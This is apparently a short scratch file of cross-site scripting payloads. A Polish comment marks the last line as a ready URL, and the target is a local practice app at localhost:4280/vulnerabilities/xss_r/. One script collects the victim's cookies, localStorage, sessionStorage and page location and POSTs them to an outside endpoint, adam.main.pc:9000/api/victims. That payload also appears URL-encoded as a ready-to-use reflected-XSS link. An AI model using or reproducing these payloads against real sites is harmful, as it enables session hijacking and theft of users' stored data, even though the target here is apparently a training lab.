<script>
fetch('https://randomuser.me/api/')
.then(it => it.json())
.then(it => it.results.at(0).login.sha256)
.then(token => {
           console.log('setting token -',{token})
})
</script>


<script>
function prepareDataPack(){
    return {
      localStorage: window.localStorage,
      cookie:document.cookie,
      sessionStorage:window.sessionStorage,
      location:document.location,
    }
};

fetch('http://adam.main.pc:9000/api/victims', {
    method:'POST',
    body:JSON.stringify(prepareDataPack(), null ,2),
    mode:'no-cors'
})
</script>



// gotowy url
//  http://localhost:4280/vulnerabilities/xss_r/?name=%3Cscript%3E+function+prepareDataPack%28%29%7B+++++return+%7B+++++++localStorage%3A+window.localStorage%2C+++++++cookie%3Adocument.cookie%2C+++++++sessionStorage%3Awindow.sessionStorage%2C+++++++location%3Adocument.location%2C+++++%7D+%7D%3B++fetch%28%27http%3A%2F%2Fadam.main.pc%3A9000%2Fapi%2Fvictims%27%2C+%7B+++++method%3A%27POST%27%2C+++++body%3AJSON.stringify%28prepareDataPack%28%29%2C+null+%2C2%29%2C+++++mode%3A%27no-cors%27+%7D%29+%3C%2Fscript%3E#